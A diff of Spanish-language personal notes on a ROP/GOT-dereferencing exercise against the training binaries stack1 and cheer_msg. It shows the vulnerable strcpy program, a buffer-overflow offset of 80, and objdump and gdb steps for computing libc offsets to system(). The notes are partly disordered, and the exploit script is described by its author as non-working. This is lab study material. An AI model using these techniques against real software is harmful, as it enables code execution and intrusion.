@@ -200,46 +200,66 @@ Ref: ROP-libc.pdf
 	
 	1.- GOT DEFERENCING
 	
-	El valor fijo de printf es, aquí tener en cuenta que en la segunda llamada escribe en 
+	Ejemplo sencillo: stack1
 	
-	objdump -R cheer_msg | grep printf
-	0804a010 R_386_JUMP_SLOT   printf@GLIBC_2.0
-	
-	Dos maneras de calcular el offset respecto a printf por ejemplo:
-	
-	a) Usando objdump:
-	
-	objdump -T /lib/i386-linux-gnu/libc.so.6 | grep system
-	0003ab30  w   DF .text	00000037  GLIBC_2.0   system
-	
-	objdump -T /lib/i386-linux-gnu/libc.so.6 | grep printf
-	00049930 g    DF .text	0000002a  GLIBC_2.0   printf
+	#include <stdlib.h>
+	#include <unistd.h>
+	#include <stdio.h>
+	#include <string.h>
 
-	libc:
-	00049930 printf 
-	0003ab30 system
-	
-	offset = system-printf = FFFFFFFFFFFF1200
-	
-	b) Usando gdb:
-	
-	gdb-peda$ p system
-	$1 = {<text variable, no debug info>} 0xb7e32b30 <__libc_system>
-	gdb-peda$ p printf
-	$2 = {<text variable, no debug info>} 0xb7e41930 <__printf>
-	gdb-peda$ p /x 0xb7e32b30-0xb7e41930
-	$3 = 0xffff1200
-	gdb-peda$ x/2i printf+0xffff1200
-	0xb7e32b30 <__libc_system>:	sub    esp,0xc
-	0xb7e32b33 <__libc_system+3>:	mov    eax,DWORD PTR [esp+0x10]
+	int main(int argc, char **argv)
+	{
+	  volatile int modified;
+	  char buffer[64];
+
+	  if(argc == 1) {
+	      errx(1, "please specify an argument\n");
+	  }
+
+	  modified = 0;
+	  strcpy(buffer, argv[1]);
+
+	  if(modified == 0x61626364) {
+	      printf("you have correctly got the variable to the right value\n");
+	  } else {
+	      printf("Try again, you got 0x%08x\n", modified);
+	  }
+	}
+
 	
 	
 - Primero hago el sencillo, stack1:
 
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char **argv)
+{
+  volatile int modified;
+  char buffer[64];
+
+  if(argc == 1) {
+      errx(1, "please specify an argument\n");
+  }
+
+  modified = 0;
+  strcpy(buffer, argv[1]);
+
+  if(modified == 0x61626364) {
+      printf("you have correctly got the variable to the right value\n");
+  } else {
+      printf("Try again, you got 0x%08x\n", modified);
+  }
+}
+
+
+Vemos que "peta" al sobrepasar 80 caracteres:
 root@kali:~/Documents/Seccon# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 100 -q 0x37634136
 [*] Exact match at offset 80
 
-
+Las funciones que vamos a tener para calcular el offset con system:
 objdump -t ./stack1 | grep GLIBC
 00000000       F *UND*	00000000              __libc_start_main@@GLIBC_2.0
 00000000       F *UND*	00000000              strcpy@@GLIBC_2.0
@@ -247,12 +267,10 @@ objdump -t ./stack1 | grep GLIBC
 00000000       F *UND*	00000000              errx@@GLIBC_2.0
 00000000       F *UND*	00000000              puts@@GLIBC_2.0
 
-
+Las llamadas a la función en el código ensamblador, en .plt y en la función main:
 
 objdump -M intel -drw ./stack1 | grep strcpy -b3
-1479- 804835e:	68 08 00 00 00       	push   0x8
-1522- 8048363:	e9 d0 ff ff ff       	jmp    8048338 <.plt>
-1576-
+
 1577:08048368 <strcpy@plt>:
 1600- 8048368:	ff 25 10 97 04 08    	jmp    DWORD PTR ds:0x8049710
 1662- 804836e:	68 10 00 00 00       	push   0x10
@@ -262,10 +280,35 @@ objdump -M intel -drw ./stack1 | grep strcpy -b3
 6556- 804849b:	8d 44 24 1c          	lea    eax,[esp+0x1c]
 6610- 804849f:	89 04 24             	mov    DWORD PTR [esp],eax
 6669: 80484a2:	e8 c1 fe ff ff       	call   8048368 <strcpy@plt>
-6729- 80484a7:	8b 44 24 5c          	mov    eax,DWORD PTR [esp+0x5c]
-6793- 80484ab:	3d 64 63 62 61       	cmp    eax,0x61626364
-6847- 80484b0:	75 0e                	jne    80484c0 <main+0x5c>
 
+- Valores que debemos calcular para preparar el exploit:
+
+a) Saber el valor de strcpy en GOT, como vemos más arriba de PLT se llama a la función en GOT haciendo un "jmp DWORD PTR ds:0x8049710":
+    strcpy@GOT: 0x08049710
+b) Hallar el valor del offset, para ello podemos hacerlo de dos maneras:
+   - Mediante objdump:
+	objdump -T /lib/i386-linux-gnu/libc.so.6 | egrep 'strcpy$|system$'
+	00075580 g   iD  .text	00000042  GLIBC_2.0   strcpy
+	0003ab30 g    DF .text	00000037  GLIBC_PRIVATE __libc_system
+	0003ab30  w   DF .text	00000037  GLIBC_2.0   system
+	Offset system-strcpy: 0003ab30-00075580 = 0xfffc55b0
+		
+   - Directamente en gdb:
+   	gdb-peda$ p system
+	$3 = {<text variable, no debug info>} 0xb7e46b30 <__libc_system>
+	gdb-peda$ p strcpy
+	$4 = {<text gnu-indirect-function variable, no debug info>} 0xb7e81580 <strcpy>
+	gdb-peda$ p/x 0xb7e46b30-0xb7e81580
+	$5 = 0xfffc55b0
+   
+   Estos métodos anteriores no dan el valor del offset tal como pone en el blog, me daba error con estos valores. Al investigar un poco, he tenido que mirar el valor
+  
+c) Hallar posición de memoria donde podamos guardar el offset calculado anteriormente:	
+   data: 0x08049720
+
+- El proceso de construcción del exploit sería el siguiente:
+
+a) Encontramos una dirección de memoria donde podamos guardar el offset.
 
 0xb7feff40 <_dl_runtime_resolve>:	push   eax
 
@@ -299,6 +342,8 @@ $5 = 0xfffc55b0
 
 readelf -S stack1 | grep "\.data"
   [24] .data             PROGBITS        08049720 000720 000008 00  WA  0   0  4
+
+
 
 
 Este sería mi script, que no funciona:
@@ -361,6 +406,47 @@ payload = junk + rop
  
 print payload
 
+
+
+
+
+
+El caso de cheer_msg:
+
+
+	El valor fijo de printf es, aquí tener en cuenta que en la segunda llamada escribe en 
+	
+	objdump -R cheer_msg | grep printf
+	0804a010 R_386_JUMP_SLOT   printf@GLIBC_2.0
+	
+	Dos maneras de calcular el offset respecto a printf por ejemplo:
+	
+	a) Usando objdump:
+	
+	objdump -T /lib/i386-linux-gnu/libc.so.6 | grep system
+	0003ab30  w   DF .text	00000037  GLIBC_2.0   system
+	
+	objdump -T /lib/i386-linux-gnu/libc.so.6 | grep printf
+	00049930 g    DF .text	0000002a  GLIBC_2.0   printf
+
+	libc:
+	00049930 printf 
+	0003ab30 system
+	
+	offset = system-printf = FFFFFFFFFFFF1200
+	
+	b) Usando gdb:
+	
+	gdb-peda$ p system
+	$1 = {<text variable, no debug info>} 0xb7e32b30 <__libc_system>
+	gdb-peda$ p printf
+	$2 = {<text variable, no debug info>} 0xb7e41930 <__printf>
+	gdb-peda$ p /x 0xb7e32b30-0xb7e41930
+	$3 = 0xffff1200
+	gdb-peda$ x/2i printf+0xffff1200
+	0xb7e32b30 <__libc_system>:	sub    esp,0xc
+	0xb7e32b33 <__libc_system+3>:	mov    eax,DWORD PTR [esp+0x10]
+	
 
 
 
